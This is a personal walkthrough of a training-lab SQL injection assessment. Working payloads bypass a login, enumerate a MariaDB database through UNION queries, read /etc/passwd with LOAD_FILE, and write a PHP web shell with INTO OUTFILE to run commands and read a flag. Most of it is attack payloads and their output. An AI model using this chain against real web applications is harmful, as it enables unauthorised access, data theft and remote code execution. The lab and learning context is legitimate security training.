
# Brief

The company `Inlanefreight` has contracted you to perform a web application assessment against one of their public-facing websites. In light of a recent breach of one of their main competitors, they are particularly concerned with SQL injection vulnerabilities and the damage the discovery and successful exploitation of this attack could do to their public image and bottom line.

They provided a target IP address and no further information about their website. Perform a full assessment of the web application from a "grey box" approach, checking for the existence of SQL injection vulnerabilities.

Find the vulnerabilities and submit a final flag using the skills we covered to complete this module. Don't forget to think outside the box!


# Questions

1. Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system. Submit the contents of the flag as your answer.

```sh
# Target
83.136.253.217:59786

# Maybe nmap is not needed? Access the app
http://83.136.253.217:59786

# We see a login page. Check for SQLi

# None of the payload known for detection are working. Just returning `Incorrect Credentuials`.

# To bypass the login, you need to blindly enter. I had to google because it made no sense to not have an entry point
admin' or '1'='1-- - # Failed
admin' or 1=1-- - ' # Pass
admin' or 1=1 -- - ' # Pass
' or 1=1 -- - ' # Works too
' OR '1'='1' -- - ' # Pass
' or '1'='1' -- - ' # Pass

# Sends you to
http://83.136.253.217:59786/dashboard/dashboard.php


# In there, there's another SQLi, in the seach box. The second colon `'` is there for formatting. Don't blindly copy
' ' # Returns

You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1 '


# So, we know we have mariaDB. Repeat the payload to have the columns back.
' or 1=1-- - ' 


# No Errors. Find the number of columns
' UNION SELECT 1,2,3-- - '
' UNION SELECT 1,2,3,4,5-- - '


# So, we have 5 columns. What versions?
' UNION select 1,@@version,3,4-- - '
' UNION SELECT 1,2,@@version,4,5-- - '

10.3.22-MariaDB-1ubuntu1


# Who are we?
' UNION SELECT 1, 2, user(), 4, 5-- - '

root@localhost


# What privileges do we have?
' UNION SELECT 1, grantee, privilege_type, 4, 5 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- - '

FILE is present


# Secure_privilege?
' UNION SELECT 1, variable_name, variable_value, 4, 5 FROM information_schema.global_variables where variable_name="secure_file_priv"-- - '

EMPTY


# Meaning, we can write to the whole filesystem. Or can we?
' union select "",'file written successfully!',"","", "" into outfile '/var/www/html/proof.txt'-- - '

Can't create/write to file '/var/www/html/proof.txt' (Errcode: 13 "Permission denied") '


# AWESOME!!! No writting perms there. Can we write into /tmp?
' union select "",'file written successfully!',"","", "" into outfile '/tmp/proof.txt'-- - '


# Yes. No error returned. How do we read this? From the URL using directory traversal, we failed. Can we load the file?
' UNION SELECT 1, 2, LOAD_FILE("/etc/passwd"), 4, 5-- - '

# Yes. How about the one we wrote?
' UNION SELECT 1, 2, LOAD_FILE("/tmp/proof.txt"), 4, 5-- - '


# Yes. Can I just read from the load file?
' UNION SELECT 1, 2, LOAD_FILE("/flag.txt"), 4, 5-- - '


# Nope. Or that the flag doesn't exist there. Or it has a different name?
' UNION SELECT 1, 2, LOAD_FILE("/proof.txt"), 4, 5-- - '


# Nope. Where can I write to?
' union select "",'file written successfully!',"","", "" into outfile '/var/www/html/dashboard/proof.txt'-- - '


# No error. Let's confirm that
' UNION SELECT 1, 2, LOAD_FILE("/var/www/html/dashboard/proof.txt"), 4, 5-- - '


# Yes. Can I write my webshell here then?
' union select "",'<?php system($_REQUEST[gt]); ?>', "", "", "" into outfile '/var/www/html/dashboard/shell.php'-- - '


# No errors. Can I access? 
http://83.136.253.217:59786/dashboard/shell.php?gt=id


# Success!!! Start hunting for the flag using directory traversal.
view-source:http://83.136.253.217:59786/dashboard/shell.php?gt=ls%20-la%20../../../../

1	Adam	January	1337$	5%
2	James	March	1213$	8%
	total 68
drwxr-xr-x   1 root root 4096 May 20 02:16 .
drwxr-xr-x   1 root root 4096 May 20 02:16 ..
lrwxrwxrwx   1 root root    7 Jul  3  2020 bin -> usr/bin
drwxr-xr-x   2 root root 4096 Apr 15  2020 boot
drwxr-xr-x   5 root root  360 May 20 02:16 dev
drwxr-xr-x   1 root root 4096 Sep 11  2020 etc
-rw-r--r--   1 root root   33 Sep 11  2020 flag_cae1dadcd174.txt
drwxr-xr-x   2 root root 4096 Apr 15  2020 home
lrwxrwxrwx   1 root root    7 Jul  3  2020 lib -> usr/lib
lrwxrwxrwx   1 root root    9 Jul  3  2020 lib32 -> usr/lib32
lrwxrwxrwx   1 root root    9 Jul  3  2020 lib64 -> usr/lib64
lrwxrwxrwx   1 root root   10 Jul  3  2020 libx32 -> usr/libx32
drwxr-xr-x   2 root root 4096 Jul  3  2020 media
drwxr-xr-x   2 root root 4096 Jul  3  2020 mnt
drwxr-xr-x   2 root root 4096 Jul  3  2020 opt
dr-xr-xr-x 381 root root    0 May 20 02:16 proc
drwx------   1 root root 4096 Jul  9  2020 root
drwxr-xr-x   1 root root 4096 May 20 02:16 run
lrwxrwxrwx   1 root root    8 Jul  3  2020 sbin -> usr/sbin
drwxr-xr-x   2 root root 4096 Jul  3  2020 srv
dr-xr-xr-x  13 root root    0 May 20 02:16 sys
drwxrwxrwt   1 root root 4096 May 20 03:23 tmp
drwxr-xr-x   1 root root 4096 Jul  3  2020 usr
drwxr-xr-x   1 root root 4096 Jul  9  2020 var


# Read the flag
view-source:http://83.136.253.217:59786/dashboard/shell.php?gt=cat%20../../../../flag_cae1dadcd174.txt

	******
```


# Reflexions

I had a doubtful moment there, looking for the entry point. I didn't realize I needed to just blindly paste the payload to bypass the login page. 
I sincerely dislike copying and pasting stuffs for the sake of it.
I wish there was a detection added to the lab. 

Anyways, glad this is completed.
